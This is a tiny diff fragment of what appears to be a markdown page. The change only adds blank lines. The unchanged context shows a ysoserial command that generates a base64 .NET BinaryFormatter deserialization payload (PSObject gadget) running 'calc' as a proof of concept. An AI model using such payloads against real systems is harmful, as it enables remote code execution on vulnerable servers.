@@ -14,3 +14,5 @@ updated_at: '2023-04-06T03:55:59.103773+00:00'
 ```bash
 ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
 ```
+
+
